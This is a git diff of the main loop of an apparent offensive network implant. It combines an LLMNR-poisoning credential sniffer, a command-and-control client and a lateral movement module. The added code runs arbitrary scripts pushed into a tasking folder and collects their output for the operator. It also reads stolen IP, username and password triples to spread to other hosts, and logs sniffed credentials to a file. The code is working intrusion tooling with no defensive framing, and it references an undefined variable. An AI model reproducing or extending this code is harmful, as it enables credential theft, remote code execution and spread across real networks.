@@ -1,11 +1,20 @@
 import multiprocessing
 import os
+import shutil
 import subprocess
+import sys
 import time
 import LlmnrPoisining.hashcat.sniffCredentials as sniffCredentials
 import LateralMovement.transfer as transfer
 import communication.ClientSide.client as client
-import getmac
+
+# def get_ip_for_mac(mac_address):
+#     ans , unans = sr1(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=3, hwdst=mac_address))
+#     print(ans)
+#     for s, r in ans:
+#         if r[ARP].hwsrc == mac_address:
+#             return r[ARP].psrc
+#     return None
 
 
 def sniff(conn2):
@@ -14,8 +23,20 @@ def sniff(conn2):
 
 
 def comm():
-    os.chdir('communication/ClientSide/')
+    os.chdir('./communication/ClientSide/')
     client.main()
+
+
+def script(filename):
+    os.chdir('./communication/ClientSide/script')
+    with open(filename.split('.')[0] + 'Output.txt', 'w') as f:
+        subprocess.call(['python', filename], stdout=f)
+        f.close()
+    os.remove('./' + filename)
+    for f in os.listdir('./'):
+        shutil.move('./' + f, '../output/' + f)
+
+
 
 
 def main():
@@ -26,8 +47,9 @@ def main():
     sniffer_conn, conn2 = multiprocessing.Pipe()
     sniffer = multiprocessing.Process(target=sniff, args=(conn2,))
     sniffer.start()
-    client = multiprocessing.Process(target=comm)
+    commu = multiprocessing.Process(target=comm)
     t = time.time()
+    run = multiprocessing.Process()
     while True:
         if sniffer_conn.poll():
             data = sniffer_conn.recv()
@@ -38,25 +60,40 @@ def main():
             privilege = privilege.close()
             os.chdir('..')
             if (privilege == None or privilege == 0):
-                mac_address = str(getmac.get_mac_address(ip=data[2]))
                 if (os.path.exists('communication/ClientSide/output/default.txt')):
                     mode = 'a'
                 else:
                     mode = 'w'
                 with open('communication/ClientSide/output/default.txt', mode) as f:
-                    f.write(f'{mac_address}:{data[0]}:{data[1]}\n')
-
+                    f.write(f'{ip}:{data[0]}:{data[1]}\n')
             print(str(privilege))
 
-            # result = transfer.main(*data)
-            # if(result):
-            #
-            # else:
-            #     print(result)
+        filename = os.listdir('./communication/ClientSide/script')
+        if (filename and not run.is_alive()):
+            print('new process')
+            print(filename)
+            if (filename[0] == 'move.txt'):
+                with open('./communication/ClientSide/script/' + filename[0], 'r') as f:
+                    ip, user, password = f.read().split(':')
+                    f.close()
+                os.remove('./communication/ClientSide/script/' + filename[0])
+                if ip:
+                    os.chdir('./LateralMovement')
+                    sniffer.terminate()
+                    result = transfer.main(ip, user, password)
+                    print('finished tranfer')
+                    if(result):
+                        sys.exit()
+                    else:
+                        print(result)
+            else:
+                run = multiprocessing.Process(target=script, args=(filename[0],))
+                run.start()
 
-        if (time.time() - t > 5 and not client.is_alive()):
+        if (not commu.is_alive() and time.time() - t > 5):
             print('comm')
-            client.start()
+            commu = multiprocessing.Process(target=comm)
+            commu.start()
             t = time.time()
 
 
